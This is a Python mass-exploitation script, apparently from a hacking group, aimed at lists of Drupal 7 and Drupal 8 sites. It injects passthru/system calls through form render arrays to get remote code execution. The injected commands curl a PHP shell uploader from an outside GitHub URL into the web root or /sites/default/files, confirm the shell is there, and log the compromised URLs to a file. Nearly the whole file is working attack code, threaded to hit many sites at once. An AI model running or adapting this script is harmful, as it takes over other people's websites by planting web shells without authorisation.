import sys
import os, re, requests
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
import json
from multiprocessing import Pool
from concurrent.futures import ThreadPoolExecutor
import requests, re, sys, threading, json
import threading
from multiprocessing.dummy import Pool
from queue import Queue
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init
import urllib
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT

def timezone(site):
	try:
		if '://' not in site:
			url = 'http://'+site
		else:
			url = site

		#cek uname
		command = ('uname -a')
		data1 = url+'/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
		data2 = {'form_id':'user_register_form','_drupal_ajax':'1','timezone[a][#lazy_builder][]':'passthru','timezone[a][#lazy_builder][][]':command}
		ambush = requests.post(data1, data=data2, timeout=5).text

		#cek home
		command2 = ('curl https://raw.githubusercontent.com/Avinash-acid/Shell-Uploader/master/uploader.php -o sayang.php')
		data3 = url+'/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
		data4 = {'form_id':'user_register_form','_drupal_ajax':'1','timezone[a][#lazy_builder][]':'passthru','timezone[a][#lazy_builder][][]':command2}
		jembit = requests.post(data3, data=data4, timeout=5).text
		kontoool = requests.get(url+'/sayang.php')

		#cek default
		command3 = ('curl https://raw.githubusercontent.com/Avinash-acid/Shell-Uploader/master/uploader.php > /sites/default/files/sayang.php')
		data100 = url+'/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
		data200 = {'form_id':'user_register_form','_drupal_ajax':'1','timezone[a][#lazy_builder][]':'passthru','timezone[a][#lazy_builder][][]':command3}
		pepek = requests.post(data100, data=data200, timeout=5)
		kontiil = requests.get(url+'/sites/default/files/sayang.php')
		if 'Linux' in ambush:
			print('{}[ {}VULNERABLE {}] {} {}{} [ {}DRUPAL 8 {}] {}[ {}TIMEZONE {}] ' .format(fr,fc,fr,fg,url,fr,fc,fr,fr,fc,fr))
			open('drupal_vuln.txt', 'a').write(url + "\n")
			print('   {}[ {}+ {}] {}Exploiting....' .format(fr,fc,fr,fc))
			if 'Avinash Kumar Thapa' in kontoool:
				print('   [ + ] Exploit Success {}/sayang.php' .format(url))
				open('drupal_vuln.txt', 'a').write(url+'/sayang.php')

			else:
				print('   {}[ {}+ {}] {}Exploit Failed, Home DIR RED' .format(fc,fr,fc,fr))
				print('   {}[ {}i {}] {}Checking Dir Writable /sites/default/files' .format(fr,fc,fr,fc))
				if 'Avinash Kumar Thapa' in kontiil:
					print(' [ + ] Success {}/sites/default/files/sayang.php')
					open('drupal_vuln.txt', 'a').write(url+'/sites/default/files/sayang.php')
				else:
					print('   {}[ {}+ {}] {}Exploit Failed ' .format(fc,fr,fc,fr))

		else:
			print('{}[ {}NOT VULNERABLE {}] {}{}' .format(fc,fr,fc,fg,url))
	except requests.exceptions.ConnectTimeout:
		print("{}[ {}NOT VULNERABLE {}] {}{} {}[{}CONNECTION TIMEOUT {}] " .format(fc,fr,fc,fg,url,fc,fr,fc))
	except Exception as e:
		#print('{}[ {}NOT VULNERABLE {}] {}{} {}[ {}URL ERROR {}] ' .format(fc,fr,fc,fg,url,fc,fr,fc))
		print(e)

def mail(site):
	try:
		if '://' not in site:
			url = 'http://'+site
		else:
			url = site

		command = ('uname -a')
		url1 = url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup', 'mail[#markup]':command}
		ambush2 = requests.post(url1, data=payload, timeout=5).text
		url2 = url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
		payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup', 'mail[#markup]':'curl https://raw.githubusercontent.com/Avinash-acid/Shell-Uploader/master/uploader.php -o sayang.php'}
		ambuz = requests.post(url2, data=payload2, timeout=5).text
		bla = requests.get(url+'/sayang.php')
		cekdir = url+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
		hajar = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup', 'mail[#markup]':'curl https://raw.githubusercontent.com/Avinash-acid/Shell-Uploader/master/uploader.php > /sites/default/files/sayang.php'}
		kontill = url+'/sites/default/files/sayang.php'
		if 'Linux' in ambush2:
			print('{}[ {}VULNERABLE {}] {}{} {}[ {}DRUPAL 8 {}] {}[ {}MAIL {}] ' .format(fr,fc,fr,fg,url,fr,fc,fr,fr,fc,fr))
			print(" {}  [ {}+ {}] {}Exploiting ... " .format(fr,fc,fr,fc))
			if 'Avinash Kumar Thapa' in bla:
				print(" [ + ] Exploit Success ... ")
				open('drupal_vuln.txt', 'a').write(url + "\n")

			else:
				print(' {}  [ {}+ {}] {}Exploit Failed, Dir RED in home Directory' .format(fc,fr,fc,fg))
				print("   [ + ] CHECKING In dir /sites/default/files")
				if 'Avinash Kumar Thapa' in kontill:
					print(' [ + ] Exploiting Success --> {}/sites/default/files/sayang.php')
					open('drupal_vuln.txt', 'a').write(url+'/sites/default/files/sayang.php')

				else:
					print('   {}[ {}i {}] {}Exploiting Failed, No Writable Dir' .format(fc,fr,fc,fr))



		else:
			print('{}[ {}NOT VULNERABLE {}] {}{}' .format(fc,fr,fc,fg,url))
	except requests.exceptions.ConnectTimeout:
		print("{}[ {}NOT VULNERABLE {}] {}{} {}[{}CONNECTION TIMEOUT {}] " .format(fc,fr,fc,fg,url,fc,fr,fc))
	except Exception as e:
		#print('{}[ {}NOT VULNERABLE {}] {}{} {}[ {}URL ERROR {}] ' .format(fc,fr,fc,fg,url,fc,fr,fc))
		print(e)


def drupal7_1(site):
	try:
		if '://' not in site:
			url = 'http://'+site
		else:
			url = site
		kentot = (url+'?q=user/password&name[%23post_render][]=system&name[%23markup]=uname -a&name[%23type]=markup')
		data = {
		   'form_id':'user_pass',
		   '_triggering_element_name':'name'
		}
		r = requests.post(kentot,data = data,verify = False,timeout = 5)
		result = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if result:
			found = result.group(1)
			url2= url + '?q=file/ajax/name/%23value/'+found
			data = {'form_build_id' : found}
			r = requests.post(url2,data = data,verify = False,timeout = 5).text
			kentot2 = (url+'?q=user/password&name[%23post_render][]=system&name[%23markup]=curl https://raw.githubusercontent.com/Avinash-acid/Shell-Uploader/master/uploader.php > /sites/default/files/sayang.php&name[%23type]=markup')
			data6 = {
				'form_id':'user_pass',
				'_triggering_element_name':'name'
			}
			re2 = requests.post(kentot2,data = data6,verify = False,timeout = 5)
			result2 = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', re2.text)
			if result2:
				found3  = result2.group(1)
				url23 = url+'?q=file/ajax/name/%23value/'+found3
				data1 = {'form_build_id' : found3}
				babi = requests.post(url23, data=data1, verify = False, timeout=5)
				cek = requests.get(url+'/sites/default/files/sayang.php').text
			else:
				pass
			kentot3 = (url+'?q=user/password&name[%23post_render][]=system&name[%23markup]=curl https://raw.githubusercontent.com/Avinash-acid/Shell-Uploader/master/uploader.php -o sayang.php&name[%23type]=markup')
			data7 = {
				'form_id':'user_pass',
				'_triggering_element_name':'name'
			}
			re3 = requests.post(kentot3,data = data7,verify = False,timeout = 5)
			result3 = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', re3.text)
			if result3:
				found4  = result3.group(1)
				url234 = url+'?q=file/ajax/name/%23value/'+found4
				data2 = {'form_build_id' : found4}
				babi = requests.post(url234, data=data2, verify = False, timeout=5)
				cek1 = requests.get(url+'/sayang.php').text
			else:
				pass

			if 'Linux' in r:
				print("{}[ {}VULNERABLE {}] {}{} {}[ {}DRUPAL 7 {}]" .format(fr,fc,fr,fg,url,fr,fc,fr))
				print(" {}  [ {}+ {}] {}Exploiting" .format(fr,fc,fr,fc))
				if 'Avinash Kumar Thapa' in cek:
					print("{} [ + ] Exploit Success --> {}/sites/default/files/sayang.php" .format(fg,url))
					open('drupal_vuln.txt', 'a').write(url+'/sites/default/files/sayang.php')

				else:
					print('{}   [ {}+ {}] {}Exploiting Failed, {}[ {}NO DIR WRITABLE {}]' .format(fc,fr,fc,fc,fc,fr,fc))
					print("{}   [ i ] Checking in Home Directory.." .format(fg))
					if 'Avinash Kumar Thapa' in cek1:
						print("{}   [ + ] Exploit Success --> {}/sayang.php" .format(fc, url))
						open('drupal_vuln.txt', 'a').write(url+'/sayang.php')

					else:
						print("{}   [ + ] Exploit Failed DIR RED " .format(fr))
			#	upshell(url)

					#writable(url)
					
			else:
				print('{}[ {}NOT VULNERABLE {}] {}{}' .format(fc,fr,fc,fg,url))
		else:
			print('{}[ {}NOT VULNERABLE {}] {}{}' .format(fc,fr,fc,fg,url))
	except requests.exceptions.ConnectTimeout:
		print("{}[ {}NOT VULNERABLE {}] {}{} {}[{}CONNECTION TIMEOUT {}] " .format(fc,fr,fc,fg,url,fc,fr,fc))
	except Exception as e:
		#print('{}[ {}NOT VULNERABLE {}] {}{} {}[ {}URL ERROR {}] ' .format(fc,fr,fc,fg,url,fc,fr,fc))
		print(e)

def kontol(site):
	timezone(site)
	mail(site)
	drupal7_1(site)


if __name__ == '__main__':
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""
	- FamilyAttackCyber
	- Serizawa@FamilyAttackCyber
	- fb : Zekkel AR - Zekkel Illumi
	- Thanks to all
	""")
	mmc = input(' LIST : ')
	thread= input(' Thread : ')
	a = open(mmc, 'r').read().splitlines()
	ThreadPool = Pool(int(thread))
	Threads = ThreadPool.map(kontol, a)
	
